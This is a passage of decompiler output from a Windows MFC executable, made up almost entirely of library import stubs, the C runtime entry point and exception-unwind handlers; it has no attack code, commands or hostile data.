                    // WARNING: Treating indirect jump as call
  pCVar1 = (CString *)operator_();
  return pCVar1;
}

// WARNING: Exceeded maximum restarts with more pending

CString * __thiscall operator_(CString *this,char *param_1)

{
  CString *pCVar1;
  
                    // WARNING: Could not recover jumptable at 0x00412da0. Too many branches
                    // WARNING: Treating indirect jump as call
  pCVar1 = (CString *)operator_();
  return pCVar1;
}

// WARNING: Exceeded maximum restarts with more pending

void __thiscall CString(CString *this)

{
                    // WARNING: Could not recover jumptable at 0x00412da6. Too many branches
                    // WARNING: Treating indirect jump as call
  CString();
  return;
}

CWnd * FromHandle(HWND__ *param_1)

{
  CWnd *pCVar1;
  
                    // WARNING: Could not recover jumptable at 0x00412dac. Too many branches
                    // WARNING: Treating indirect jump as call
  pCVar1 = FromHandle(param_1);
  return pCVar1;
}

// WARNING: Exceeded maximum restarts with more pending

int __thiscall Find(CString *this,char *param_1,int param_2)

{
  int iVar1;
  
                    // WARNING: Could not recover jumptable at 0x00412db2. Too many branches
                    // WARNING: Treating indirect jump as call
  iVar1 = Find();
  return iVar1;
}

// WARNING: Exceeded maximum restarts with more pending

void __thiscall _CPaintDC(CPaintDC *this)

{
                    // WARNING: Could not recover jumptable at 0x00412db8. Too many branches
                    // WARNING: Treating indirect jump as call
  _CPaintDC();
  return;
}

// WARNING: Exceeded maximum restarts with more pending

int __thiscall SetBkMode(CDC *this,int param_1)

{
  int iVar1;
  
                    // WARNING: Could not recover jumptable at 0x00412dc4. Too many branches
                    // WARNING: Treating indirect jump as call
  iVar1 = SetBkMode();
  return iVar1;
}

// WARNING: Exceeded maximum restarts with more pending

CFont * __thiscall SelectObject(CDC *this,CFont *param_1)

{
  CFont *pCVar1;
  
                    // WARNING: Could not recover jumptable at 0x00412dca. Too many branches
                    // WARNING: Treating indirect jump as call
  pCVar1 = (CFont *)SelectObject();
  return pCVar1;
}

// WARNING: Exceeded maximum restarts with more pending

void __thiscall CPaintDC(CPaintDC *this,CWnd *param_1)

{
                    // WARNING: Could not recover jumptable at 0x00412dd0. Too many branches
                    // WARNING: Treating indirect jump as call
  CPaintDC();
  return;
}

// WARNING: Exceeded maximum restarts with more pending

void __thiscall GetWindowTextA(CWnd *this,CString *param_1)

{
                    // WARNING: Could not recover jumptable at 0x00412dd6. Too many branches
                    // WARNING: Treating indirect jump as call
  GetWindowTextA();
  return;
}

// WARNING: Exceeded maximum restarts with more pending

int __thiscall ModifyStyle(CWnd *this,ulong param_1,ulong param_2,uint param_3)

{
  int iVar1;
  
                    // WARNING: Could not recover jumptable at 0x00412ddc. Too many branches
                    // WARNING: Treating indirect jump as call
  iVar1 = ModifyStyle();
  return iVar1;
}

CGdiObject * FromHandle(void *param_1)

{
  CGdiObject *pCVar1;
  
                    // WARNING: Could not recover jumptable at 0x00412de2. Too many branches
                    // WARNING: Treating indirect jump as call
  pCVar1 = FromHandle(param_1);
  return pCVar1;
}

// WARNING: Exceeded maximum restarts with more pending

void __thiscall _CClientDC(CClientDC *this)

{
                    // WARNING: Could not recover jumptable at 0x00412de8. Too many branches
                    // WARNING: Treating indirect jump as call
  _CClientDC();
  return;
}

// WARNING: Exceeded maximum restarts with more pending

void __thiscall CClientDC(CClientDC *this,CWnd *param_1)

{
                    // WARNING: Could not recover jumptable at 0x00412dee. Too many branches
                    // WARNING: Treating indirect jump as call
  CClientDC();
  return;
}

void DDV_MaxChars(CDataExchange *param_1,CString *param_2,int param_3)

{
                    // WARNING: Could not recover jumptable at 0x00412df4. Too many branches
                    // WARNING: Treating indirect jump as call
  DDV_MaxChars(param_1,param_2,param_3);
  return;
}

void DDX_Text(CDataExchange *param_1,int param_2,CString *param_3)

{
                    // WARNING: Could not recover jumptable at 0x00412dfa. Too many branches
                    // WARNING: Treating indirect jump as call
  DDX_Text(param_1,param_2,param_3);
  return;
}

// WARNING: Exceeded maximum restarts with more pending

void __thiscall Format(CString *this,char *param_1,...)

{
                    // WARNING: Could not recover jumptable at 0x00412e00. Too many branches
                    // WARNING: Treating indirect jump as call
  Format();
  return;
}

// WARNING: Exceeded maximum restarts with more pending

int __thiscall UpdateData(CWnd *this,int param_1)

{
  int iVar1;
  
                    // WARNING: Could not recover jumptable at 0x00412e06. Too many branches
                    // WARNING: Treating indirect jump as call
  iVar1 = UpdateData();
  return iVar1;
}

// WARNING: Exceeded maximum restarts with more pending

void __thiscall _CDC(CDC *this)

{
                    // WARNING: Could not recover jumptable at 0x00412e3c. Too many branches
                    // WARNING: Treating indirect jump as call
  _CDC();
  return;
}

// WARNING: Exceeded maximum restarts with more pending

int __thiscall DeleteDC(CDC *this)

{
  int iVar1;
  
                    // WARNING: Could not recover jumptable at 0x00412e42. Too many branches
                    // WARNING: Treating indirect jump as call
  iVar1 = DeleteDC();
  return iVar1;
}

CGdiObject * SelectGdiObject(HDC__ *param_1,void *param_2)

{
  CGdiObject *pCVar1;
  
                    // WARNING: Could not recover jumptable at 0x00412e48. Too many branches
                    // WARNING: Treating indirect jump as call
  pCVar1 = SelectGdiObject(param_1,param_2);
  return pCVar1;
}

// WARNING: Exceeded maximum restarts with more pending

int __thiscall Attach(CDC *this,HDC__ *param_1)

{
  int iVar1;
  
                    // WARNING: Could not recover jumptable at 0x00412e4e. Too many branches
                    // WARNING: Treating indirect jump as call
  iVar1 = Attach();
  return iVar1;
}

// WARNING: Exceeded maximum restarts with more pending

void __thiscall CDC(CDC *this)

{
                    // WARNING: Could not recover jumptable at 0x00412e54. Too many branches
                    // WARNING: Treating indirect jump as call
  CDC();
  return;
}

AFX_MODULE_STATE * AfxGetModuleState(void)

{
  AFX_MODULE_STATE *pAVar1;
  
                    // WARNING: Could not recover jumptable at 0x00412e5a. Too many branches
                    // WARNING: Treating indirect jump as call
  pAVar1 = AfxGetModuleState();
  return pAVar1;
}

// WARNING: Exceeded maximum restarts with more pending

int __thiscall
SetWindowPos(CWnd *this,CWnd *param_1,int param_2,int param_3,int param_4,int param_5,uint param_6)

{
  int iVar1;
  
                    // WARNING: Could not recover jumptable at 0x00412e60. Too many branches
                    // WARNING: Treating indirect jump as call
  iVar1 = SetWindowPos();
  return iVar1;
}

// WARNING: Exceeded maximum restarts with more pending

void __thiscall CWinApp(CWinApp *this,char *param_1)

{
                    // WARNING: Could not recover jumptable at 0x00412ee4. Too many branches
                    // WARNING: Treating indirect jump as call
  CWinApp();
  return;
}

// WARNING: Exceeded maximum restarts with more pending

void __thiscall _CWinApp(CWinApp *this)

{
                    // WARNING: Could not recover jumptable at 0x00412eea. Too many branches
                    // WARNING: Treating indirect jump as call
  _CWinApp();
  return;
}

// WARNING: Exceeded maximum restarts with more pending

void __thiscall _CButton(CButton *this)

{
                    // WARNING: Could not recover jumptable at 0x00412ef0. Too many branches
                    // WARNING: Treating indirect jump as call
  _CButton();
  return;
}

// WARNING: Exceeded maximum restarts with more pending

void __thiscall _CRichEditCtrl(CRichEditCtrl *this)

{
                    // WARNING: Could not recover jumptable at 0x00412ef6. Too many branches
                    // WARNING: Treating indirect jump as call
  _CRichEditCtrl();
  return;
}

int AfxInitRichEdit(void)

{
  int iVar1;
  
                    // WARNING: Could not recover jumptable at 0x00412efc. Too many branches
                    // WARNING: Treating indirect jump as call
  iVar1 = AfxInitRichEdit();
  return iVar1;
}

// WARNING: Exceeded maximum restarts with more pending

int __thiscall Enable3dControls(CWinApp *this)

{
  int iVar1;
  
                    // WARNING: Could not recover jumptable at 0x00412f02. Too many branches
                    // WARNING: Treating indirect jump as call
  iVar1 = Enable3dControls();
  return iVar1;
}

// WARNING: Exceeded maximum restarts with more pending

void __cdecl AfxEnableControlContainer(COccManager *param_1)

{
                    // WARNING: Could not recover jumptable at 0x00412f08. Too many branches
                    // WARNING: Treating indirect jump as call
  AfxEnableControlContainer();
  return;
}

// WARNING: Exceeded maximum restarts with more pending

void __thiscall _CDWordArray(CDWordArray *this)

{
                    // WARNING: Could not recover jumptable at 0x00412f0e. Too many branches
                    // WARNING: Treating indirect jump as call
  _CDWordArray();
  return;
}

HINSTANCE__ * AfxFindResourceHandle(char *param_1,char *param_2)

{
  HINSTANCE__ *pHVar1;
  
                    // WARNING: Could not recover jumptable at 0x00412f2c. Too many branches
                    // WARNING: Treating indirect jump as call
  pHVar1 = AfxFindResourceHandle(param_1,param_2);
  return pHVar1;
}

// WARNING: Exceeded maximum restarts with more pending

void __thiscall _CFile(CFile *this)

{
                    // WARNING: Could not recover jumptable at 0x00412f38. Too many branches
                    // WARNING: Treating indirect jump as call
  _CFile();
  return;
}

// WARNING: Exceeded maximum restarts with more pending

void __thiscall Close(CFile *this)

{
                    // WARNING: Could not recover jumptable at 0x00412f3e. Too many branches
                    // WARNING: Treating indirect jump as call
  Close();
  return;
}

// WARNING: Exceeded maximum restarts with more pending

void __thiscall CFile(CFile *this,char *param_1,uint param_2)

{
                    // WARNING: Could not recover jumptable at 0x00412f44. Too many branches
                    // WARNING: Treating indirect jump as call
  CFile();
  return;
}

// WARNING: Exceeded maximum restarts with more pending

int __thiscall SetSelectionCharFormat(CRichEditCtrl *this,_charformat *param_1)

{
  int iVar1;
  
                    // WARNING: Could not recover jumptable at 0x00412f4a. Too many branches
                    // WARNING: Treating indirect jump as call
  iVar1 = SetSelectionCharFormat();
  return iVar1;
}

// WARNING: Exceeded maximum restarts with more pending

void __thiscall SetSize(CDWordArray *this,int param_1,int param_2)

{
                    // WARNING: Could not recover jumptable at 0x00412f50. Too many branches
                    // WARNING: Treating indirect jump as call
  SetSize();
  return;
}

// WARNING: Exceeded maximum restarts with more pending

void __thiscall CString(CString *this,CString *param_1)

{
                    // WARNING: Could not recover jumptable at 0x00412f56. Too many branches
                    // WARNING: Treating indirect jump as call
  CString();
  return;
}

// WARNING: Exceeded maximum restarts with more pending

int __thiscall Replace(CString *this,char param_1,char param_2)

{
  int iVar1;
  
                    // WARNING: Could not recover jumptable at 0x00412f5c. Too many branches
                    // WARNING: Treating indirect jump as call
  iVar1 = Replace();
  return iVar1;
}

// WARNING: Exceeded maximum restarts with more pending

CString * __thiscall operator__(CString *this,CString *param_1)

{
  CString *pCVar1;
  
                    // WARNING: Could not recover jumptable at 0x00412f62. Too many branches
                    // WARNING: Treating indirect jump as call
  pCVar1 = (CString *)operator__();
  return pCVar1;
}

// WARNING: Exceeded maximum restarts with more pending

CString * __thiscall operator__(CString *this,char *param_1)

{
  CString *pCVar1;
  
                    // WARNING: Could not recover jumptable at 0x00412f68. Too many branches
                    // WARNING: Treating indirect jump as call
  pCVar1 = (CString *)operator__();
  return pCVar1;
}

// WARNING: Exceeded maximum restarts with more pending

CString __thiscall Mid(CString *this,int param_1,int param_2)

{
  CString CVar1;
  
                    // WARNING: Could not recover jumptable at 0x00412f6e. Too many branches
                    // WARNING: Treating indirect jump as call
  CVar1 = (CString)Mid();
  return CVar1;
}

// WARNING: Exceeded maximum restarts with more pending

void __thiscall CDWordArray(CDWordArray *this)

{
                    // WARNING: Could not recover jumptable at 0x00412f74. Too many branches
                    // WARNING: Treating indirect jump as call
  CDWordArray();
  return;
}

// WARNING: Exceeded maximum restarts with more pending

ulong __thiscall GetStyle(CWnd *this)

{
  ulong uVar1;
  
                    // WARNING: Could not recover jumptable at 0x00412fe6. Too many branches
                    // WARNING: Treating indirect jump as call
  uVar1 = GetStyle();
  return uVar1;
}

// WARNING: Exceeded maximum restarts with more pending

void __thiscall DeflateRect(CRect *this,tagRECT *param_1)

{
                    // WARNING: Could not recover jumptable at 0x00412fec. Too many branches
                    // WARNING: Treating indirect jump as call
  DeflateRect();
  return;
}

// WARNING: Exceeded maximum restarts with more pending

void __thiscall FillSolidRect(CDC *this,tagRECT *param_1,ulong param_2)

{
                    // WARNING: Could not recover jumptable at 0x00412ff2. Too many branches
                    // WARNING: Treating indirect jump as call
  FillSolidRect();
  return;
}

// WARNING: Exceeded maximum restarts with more pending

CPoint __thiscall SetWindowOrg(CDC *this,int param_1,int param_2)

{
  CPoint CVar1;
  
                    // WARNING: Could not recover jumptable at 0x00412ff8. Too many branches
                    // WARNING: Treating indirect jump as call
  CVar1 = (CPoint)SetWindowOrg();
  return CVar1;
}

// WARNING: Exceeded maximum restarts with more pending

void __thiscall GetRange(CProgressCtrl *this,int *param_1,int *param_2)

{
                    // WARNING: Could not recover jumptable at 0x00412ffe. Too many branches
                    // WARNING: Treating indirect jump as call
  GetRange();
  return;
}

// WARNING: Exceeded maximum restarts with more pending

uint __thiscall SetTextAlign(CDC *this,uint param_1)

{
  uint uVar1;
  
                    // WARNING: Could not recover jumptable at 0x00413004. Too many branches
                    // WARNING: Treating indirect jump as call
  uVar1 = SetTextAlign();
  return uVar1;
}

// WARNING: Exceeded maximum restarts with more pending

int __thiscall SelectClipRgn(CDC *this,CRgn *param_1)

{
  int iVar1;
  
                    // WARNING: Could not recover jumptable at 0x00413010. Too many branches
                    // WARNING: Treating indirect jump as call
  iVar1 = SelectClipRgn();
  return iVar1;
}

// WARNING: Exceeded maximum restarts with more pending

int __cdecl fclose(FILE *_File)

{
  int iVar1;
  
                    // WARNING: Could not recover jumptable at 0x00413020. Too many branches
                    // WARNING: Treating indirect jump as call
  iVar1 = fclose();
  return iVar1;
}

// WARNING: Exceeded maximum restarts with more pending

FILE * __cdecl fopen(char *_Filename,char *_Mode)

{
  FILE *pFVar1;
  
                    // WARNING: Could not recover jumptable at 0x00413026. Too many branches
                    // WARNING: Treating indirect jump as call
  pFVar1 = (FILE *)fopen();
  return pFVar1;
}

// WARNING: Exceeded maximum restarts with more pending

int __cdecl sprintf(char *_Dest,char *_Format,...)

{
  int iVar1;
  
                    // WARNING: Could not recover jumptable at 0x0041302c. Too many branches
                    // WARNING: Treating indirect jump as call
  iVar1 = sprintf();
  return iVar1;
}

// WARNING: Exceeded maximum restarts with more pending

int __cdecl rand(void)

{
  int iVar1;
  
                    // WARNING: Could not recover jumptable at 0x00413032. Too many branches
                    // WARNING: Treating indirect jump as call
  iVar1 = rand();
  return iVar1;
}

// WARNING: Exceeded maximum restarts with more pending

size_t __cdecl fwrite(void *_Str,size_t _Size,size_t _Count,FILE *_File)

{
  size_t sVar1;
  
                    // WARNING: Could not recover jumptable at 0x00413038. Too many branches
                    // WARNING: Treating indirect jump as call
  sVar1 = fwrite();
  return sVar1;
}

// WARNING: Exceeded maximum restarts with more pending

time_t __cdecl time(time_t *_Time)

{
  time_t tVar1;
  
                    // WARNING: Could not recover jumptable at 0x0041303e. Too many branches
                    // WARNING: Treating indirect jump as call
  tVar1 = time();
  return tVar1;
}

// WARNING: Exceeded maximum restarts with more pending

void __cdecl srand(uint _Seed)

{
                    // WARNING: Could not recover jumptable at 0x00413044. Too many branches
                    // WARNING: Treating indirect jump as call
  srand();
  return;
}

void _ftol(void)

{
                    // WARNING: Could not recover jumptable at 0x0041304a. Too many branches
                    // WARNING: Treating indirect jump as call
  _ftol();
  return;
}

void _local_unwind2(void)

{
                    // WARNING: Could not recover jumptable at 0x00413056. Too many branches
                    // WARNING: Treating indirect jump as call
  _local_unwind2();
  return;
}

// WARNING: Unable to track spacebase fully for stack

void FUN_00413060(void)

{
  uint in_EAX;
  undefined *puVar1;
  undefined4 local_res0;
  
  puVar1 = &stack0x00000004;
  if (0xfff < in_EAX) {
    do {
      puVar1 = puVar1 + -0x1000;
      in_EAX = in_EAX - 0x1000;
    } while (0xfff < in_EAX);
  }
  *(undefined4 *)(puVar1 + (-4 - in_EAX)) = local_res0;
  return;
}

// WARNING: Globals starting with '_' overlap smaller symbols at the same address

void __cdecl FUN_0041308f(_onexit_t param_1)

{
  if (_DAT_0042229c == -1) {
    _onexit(param_1);
    return;
  }
  __dllonexit(param_1,&DAT_0042229c,&DAT_00422298);
  return;
}

int __cdecl FUN_004130bb(_onexit_t param_1)

{
  int iVar1;
  
  iVar1 = FUN_0041308f(param_1);
  return (uint)(iVar1 != 0) - 1;
}

// WARNING: Exceeded maximum restarts with more pending

void __thiscall exception(exception *this,char **param_1)

{
                    // WARNING: Could not recover jumptable at 0x004130f6. Too many branches
                    // WARNING: Treating indirect jump as call
  exception();
  return;
}

// WARNING: Exceeded maximum restarts with more pending

void _CxxThrowException(void *pExceptionObject,ThrowInfo *pThrowInfo)

{
                    // WARNING: Could not recover jumptable at 0x004130fc. Too many branches
                    // WARNING: Treating indirect jump as call
  _CxxThrowException();
  return;
}

// WARNING: Globals starting with '_' overlap smaller symbols at the same address

void entry(void)

{
  undefined4 *puVar1;
  uint nCmdShow;
  HMODULE hInstance;
  undefined4 *in_FS_OFFSET;
  HINSTANCE hPrevInstance;
  PWSTR pCmdLine;
  PWSTR local_78;
  char **local_74;
  _startupinfo local_70;
  int local_6c;
  char **local_68;
  int local_64;
  _STARTUPINFOA local_60;
  undefined *local_1c;
  undefined4 uStack20;
  undefined *puStack16;
  undefined *puStack12;
  undefined4 local_8;
  
  puStack12 = &DAT_0041baa8;
  puStack16 = &DAT_00413050;
  uStack20 = *in_FS_OFFSET;
  *(undefined4 **)in_FS_OFFSET = &uStack20;
  local_1c = &stack0xffffff78;
  local_8 = 0;
  __set_app_type(2);
  _DAT_00422298 = 0xffffffff;
  _DAT_0042229c = 0xffffffff;
  puVar1 = (undefined4 *)__p__fmode();
  *puVar1 = DAT_0042228c;
  puVar1 = (undefined4 *)__p__commode();
  *puVar1 = DAT_00422288;
  _DAT_00422294 = *(undefined4 *)_adjust_fdiv_exref;
  FUN_004133c7();
  if (_DAT_00421790 == 0) {
    __setusermatherr(&LAB_004133c4);
  }
  FUN_004133b2();
  _initterm(&DAT_0041f014,&DAT_0041f018);
  local_70 = DAT_00422284;
  __getmainargs(&local_64,&local_74,&local_68,_DoWildCard_00422280,&local_70);
  _initterm(&DAT_0041f000,&DAT_0041f010);
  local_78 = *(PWSTR *)_acmdln_exref;
  if (*(byte *)local_78 != 0x22) {
    do {
      if (*(byte *)local_78 < 0x21) goto LAB_004131f5;
      local_78 = (PWSTR)((int)local_78 + 1);
    } while( true );
  }
  do {
    local_78 = (PWSTR)((int)local_78 + 1);
    if (*(byte *)local_78 == 0) break;
  } while (*(byte *)local_78 != 0x22);
  if (*(byte *)local_78 != 0x22) goto LAB_004131f5;
  do {
    local_78 = (PWSTR)((int)local_78 + 1);
LAB_004131f5:
    pCmdLine = local_78;
  } while ((*(byte *)local_78 != 0) && (*(byte *)local_78 < 0x21));
  local_60.dwFlags = 0;
  GetStartupInfoA((LPSTARTUPINFOA)&local_60);
  if ((local_60.dwFlags & 1) == 0) {
    nCmdShow = 10;
  }
  else {
    nCmdShow = (uint)local_60.wShowWindow;
  }
  hPrevInstance = (HINSTANCE)0x0;
  hInstance = GetModuleHandleA((LPCSTR)0x0);
  local_6c = WinMain((HINSTANCE)hInstance,hPrevInstance,pCmdLine,nCmdShow);
                    // WARNING: Subroutine does not return
  exit(local_6c);
}

// WARNING: Exceeded maximum restarts with more pending

char * __cdecl strtok(char *_Str,char *_Delim)

{
  char *pcVar1;
  
                    // WARNING: Could not recover jumptable at 0x00413260. Too many branches
                    // WARNING: Treating indirect jump as call
  pcVar1 = (char *)strtok();
  return pcVar1;
}

// WARNING: Exceeded maximum restarts with more pending

char * __cdecl strncpy(char *_Dest,char *_Source,size_t _Count)

{
  char *pcVar1;
  
                    // WARNING: Could not recover jumptable at 0x00413266. Too many branches
                    // WARNING: Treating indirect jump as call
  pcVar1 = (char *)strncpy();
  return pcVar1;
}

// WARNING: Exceeded maximum restarts with more pending

void * __cdecl memmove(void *_Dst,void *_Src,size_t _Size)

{
  void *pvVar1;
  
                    // WARNING: Could not recover jumptable at 0x0041326c. Too many branches
                    // WARNING: Treating indirect jump as call
  pvVar1 = (void *)memmove();
  return pvVar1;
}

// WARNING: Exceeded maximum restarts with more pending

void __cdecl free(void *_Memory)

{
                    // WARNING: Could not recover jumptable at 0x00413278. Too many branches
                    // WARNING: Treating indirect jump as call
  free();
  return;
}

// WARNING: Exceeded maximum restarts with more pending

void * __cdecl calloc(size_t _Count,size_t _Size)

{
  void *pvVar1;
  
                    // WARNING: Could not recover jumptable at 0x0041327e. Too many branches
                    // WARNING: Treating indirect jump as call
  pvVar1 = (void *)calloc();
  return pvVar1;
}

// WARNING: Exceeded maximum restarts with more pending

void * __cdecl malloc(size_t _Size)

{
  void *pvVar1;
  
                    // WARNING: Could not recover jumptable at 0x00413284. Too many branches
                    // WARNING: Treating indirect jump as call
  pvVar1 = (void *)malloc();
  return pvVar1;
}

// Library Function - Single Match
// Name: __allmul
// Library: Visual Studio

ulonglong __allmul(uint param_1,uint param_2,uint param_3,uint param_4)

{
  if ((param_4 | param_2) == 0) {
    return (ulonglong)param_1 * (ulonglong)param_3;
  }
  return (ulonglong)param_1 * (ulonglong)param_3 & 0xffffffff |
         (ulonglong)
         ((int)((ulonglong)param_1 * (ulonglong)param_3 >> 0x20) +
         param_2 * param_3 + param_1 * param_4) << 0x20;
}

// WARNING: Exceeded maximum restarts with more pending

uchar * __cdecl _mbsstr(uchar *_Str,uchar *_Substr)

{
  uchar *puVar1;
  
                    // WARNING: Could not recover jumptable at 0x004132c4. Too many branches
                    // WARNING: Treating indirect jump as call
  puVar1 = (uchar *)_mbsstr();
  return puVar1;
}

// WARNING: Exceeded maximum restarts with more pending

void * __cdecl realloc(void *_Memory,size_t _NewSize)

{
  void *pvVar1;
  
                    // WARNING: Could not recover jumptable at 0x004132ca. Too many branches
                    // WARNING: Treating indirect jump as call
  pvVar1 = (void *)realloc();
  return pvVar1;
}

void __dllonexit(void)

{
                    // WARNING: Could not recover jumptable at 0x0041339a. Too many branches
                    // WARNING: Treating indirect jump as call
  __dllonexit();
  return;
}

// WARNING: Exceeded maximum restarts with more pending

void __thiscall _type_info(type_info *this)

{
                    // WARNING: Could not recover jumptable at 0x004133a0. Too many branches
                    // WARNING: Treating indirect jump as call
  _type_info();
  return;
}

void _initterm(void)

{
                    // WARNING: Could not recover jumptable at 0x004133ac. Too many branches
                    // WARNING: Treating indirect jump as call
  _initterm();
  return;
}

void FUN_004133b2(void)

{
  _controlfp(0x10000,0x30000);
  return;
}

void FUN_004133c7(void)

{
  return;
}

// WARNING: Exceeded maximum restarts with more pending

uint __cdecl _controlfp(uint _NewValue,uint _Mask)

{
  uint uVar1;
  
                    // WARNING: Could not recover jumptable at 0x004133c8. Too many branches
                    // WARNING: Treating indirect jump as call
  uVar1 = _controlfp();
  return uVar1;
}

HRESULT URLDownloadToFileA(LPUNKNOWN param_1,LPCSTR param_2,LPCSTR param_3,DWORD param_4,
                          LPBINDSTATUSCALLBACK param_5)

{
  HRESULT HVar1;
  
                    // WARNING: Could not recover jumptable at 0x004133ce. Too many branches
                    // WARNING: Treating indirect jump as call
  HVar1 = URLDownloadToFileA(param_1,param_2,param_3,param_4,param_5);
  return HVar1;
}

// WARNING: Exceeded maximum restarts with more pending

void __cdecl _Xran(void)

{
                    // WARNING: Could not recover jumptable at 0x004133d4. Too many branches
                    // WARNING: Treating indirect jump as call
  _Xran();
  return;
}

// WARNING: Exceeded maximum restarts with more pending

void __cdecl _Xlen(void)

{
                    // WARNING: Could not recover jumptable at 0x004133da. Too many branches
                    // WARNING: Treating indirect jump as call
  _Xlen();
  return;
}

void Ordinal_151(void)

{
                    // WARNING: Could not recover jumptable at 0x004133e0. Too many branches
                    // WARNING: Treating indirect jump as call
  Ordinal_151();
  return;
}

int WinMain(HINSTANCE hInstance,HINSTANCE hPrevInstance,PWSTR pCmdLine,int nCmdShow)

{
  int iVar1;
  
  iVar1 = AfxWinMain((HINSTANCE__ *)hInstance,(HINSTANCE__ *)hPrevInstance,(char *)pCmdLine,nCmdShow
                    );
  return iVar1;
}

undefined4 FUN_004133fe(int param_1,undefined4 param_2)

{
  AFX_MODULE_STATE *pAVar1;
  
  pAVar1 = AfxGetModuleState();
  pAVar1[0x14] = SUB41(param_1,0);
  *(undefined4 *)(pAVar1 + 0x1040) = param_2;
  if (param_1 == 0) {
    _setmbcp(-3);
  }
  return 1;
}

int AfxWinMain(HINSTANCE__ *param_1,HINSTANCE__ *param_2,char *param_3,int param_4)

{
  int iVar1;
  
                    // WARNING: Could not recover jumptable at 0x0041343e. Too many branches
                    // WARNING: Treating indirect jump as call
  iVar1 = AfxWinMain(param_1,param_2,param_3,param_4);
  return iVar1;
}

void Unwind_00413450(void)

{
  int unaff_EBP;
  
  _CDialog(*(CDialog **)(unaff_EBP + -0x10));
  return;
}

void Unwind_00413470(void)

{
  int unaff_EBP;
  
  _CDialog(*(CDialog **)(unaff_EBP + -0x10));
  return;
}

void Unwind_00413490(void)

{
  int unaff_EBP;
  
  FUN_00404690((undefined4 *)(unaff_EBP + -0x9cc));
  return;
}

void Unwind_0041349b(void)

{
  int unaff_EBP;
  
  FUN_00404690((undefined4 *)(unaff_EBP + -0x984));
  return;
}

void Unwind_004134b0(void)

{
  int unaff_EBP;
  
  _CString((CString *)(unaff_EBP + -0xa30));
  return;
}

void Unwind_004134bb(void)

{
  int unaff_EBP;
  
  _CString((CString *)(unaff_EBP + -0xa34));
  return;
}

void Unwind_004134d0(void)

{
  int unaff_EBP;
  
  _CString((CString *)(unaff_EBP + 4));
  return;
}

void Unwind_004134f0(void)

{
  int unaff_EBP;
  
  FUN_00404690((undefined4 *)(*(int *)(unaff_EBP + -0x10) + 4));
  return;
}

void Unwind_004134fb(void)

{
  int unaff_EBP;
  
  FUN_00404690((undefined4 *)(*(int *)(unaff_EBP + -0x10) + 0x2c));
  return;
}

void Unwind_00413510(void)

{
  int unaff_EBP;
  
  FUN_00404690((undefined4 *)(*(int *)(unaff_EBP + -0x10) + 4));
  return;
}

void Unwind_0041351b(void)

{
  int unaff_EBP;
  
  FUN_00404690((undefined4 *)(*(int *)(unaff_EBP + -0x10) + 0x2c));
  return;
}

void Unwind_00413526(void)

{
  int unaff_EBP;
  
  FUN_0040a140((undefined4 *)(*(int *)(unaff_EBP + -0x10) + 0x54));
  return;
}

void Unwind_00413540(void)

{
  int **ppiVar1;
  int **ppiVar2;
  int **ppiVar3;
  int unaff_EBP;
  
  ppiVar1 = *(int ***)(unaff_EBP + -0x560);
  ppiVar3 = (int **)*ppiVar1;
  while (ppiVar3 != ppiVar1) {
    ppiVar2 = (int **)*ppiVar3;
    *(int **)ppiVar3[1] = *ppiVar3;
    *(int **)(*ppiVar3 + 1) = ppiVar3[1];
    _Tidy((
           basic_string_unsigned_short_struct_std__char_traits_unsigned_short__class_std__allocator_unsigned_short___
           *)(ppiVar3 + 2),true);
    operator_delete(ppiVar3);
    *(int *)(unaff_EBP + -0x55c) = *(int *)(unaff_EBP + -0x55c) + -1;
    ppiVar3 = ppiVar2;
  }
  operator_delete(*(void **)(unaff_EBP + -0x560));
  *(undefined4 *)(unaff_EBP + -0x560) = 0;
  *(undefined4 *)(unaff_EBP + -0x55c) = 0;
  return;
}

void Unwind_0041354b(void)

{
  int **ppiVar1;
  int **ppiVar2;
  int **ppiVar3;
  int unaff_EBP;
  
  ppiVar1 = *(int ***)(unaff_EBP + -0x570);
  ppiVar3 = (int **)*ppiVar1;
  while (ppiVar3 != ppiVar1) {
    ppiVar2 = (int **)*ppiVar3;
    *(int **)ppiVar3[1] = *ppiVar3;
    *(int **)(*ppiVar3 + 1) = ppiVar3[1];
    _Tidy((
           basic_string_unsigned_short_struct_std__char_traits_unsigned_short__class_std__allocator_unsigned_short___
           *)(ppiVar3 + 2),true);
    operator_delete(ppiVar3);
    *(int *)(unaff_EBP + -0x56c) = *(int *)(unaff_EBP + -0x56c) + -1;
    ppiVar3 = ppiVar2;
  }
  operator_delete(*(void **)(unaff_EBP + -0x570));
  *(undefined4 *)(unaff_EBP + -0x570) = 0;
  *(undefined4 *)(unaff_EBP + -0x56c) = 0;
  return;
}

// WARNING: Exceeded maximum restarts with more pending

void Unwind_00413556(void)

{
                    // WARNING: Could not recover jumptable at 0x0041355c. Too many branches
                    // WARNING: Treating indirect jump as call
    
  _basic_string_unsigned_short_struct_std__char_traits_unsigned_short__class_std__allocator_unsigned_short___
            ();
  return;
}

// WARNING: Exceeded maximum restarts with more pending

void Unwind_00413562(void)

{
                    // WARNING: Could not recover jumptable at 0x00413568. Too many branches
                    // WARNING: Treating indirect jump as call
    
  _basic_string_unsigned_short_struct_std__char_traits_unsigned_short__class_std__allocator_unsigned_short___
            ();
  return;
}

void Unwind_00413580(void)

{
  FUN_00401080();
  return;
}

void Unwind_004135a0(void)

{
  int unaff_EBP;
  
  _CDialog(*(CDialog **)(unaff_EBP + -0x10));
  return;
}

void Unwind_004135a8(void)

{
  int unaff_EBP;
  
  _CListCtrl((CListCtrl *)(*(int *)(unaff_EBP + -0x10) + 0x60));
  return;
}

void Unwind_004135c0(void)

{
  int unaff_EBP;
  
  _CDialog(*(CDialog **)(unaff_EBP + -0x14));
  return;
}

void Unwind_004135c8(void)

{
  int unaff_EBP;
  
  _CListCtrl((CListCtrl *)(*(int *)(unaff_EBP + -0x14) + 0x60));
  return;
}

void Unwind_004135d3(void)

{
  int unaff_EBP;
  
  _CComboBox((CComboBox *)(*(int *)(unaff_EBP + -0x14) + 0xa0));
  return;
}

void Unwind_004135e1(void)

{
  int unaff_EBP;
  
  FUN_00403f90((undefined4 *)(*(int *)(unaff_EBP + -0x14) + 0xe0));
  return;
}

void Unwind_004135ef(void)

{
  int unaff_EBP;
  
  **(undefined4 **)(unaff_EBP + -0x10) = 0x415bec;
  return;
}

void Unwind_004135f7(void)

{
  int unaff_EBP;
  
  **(undefined4 **)(unaff_EBP + -0x10) = 0x415bec;
  return;
}

void Unwind_00413610(void)

{
  int unaff_EBP;
  
  FUN_00403f90((undefined4 *)(unaff_EBP + -0x24));
  return;
}

void Unwind_00413618(void)

{
  int unaff_EBP;
  
  *(undefined4 *)(unaff_EBP + -0x24) = 0x415bec;
  return;
}

void Unwind_00413630(void)

{
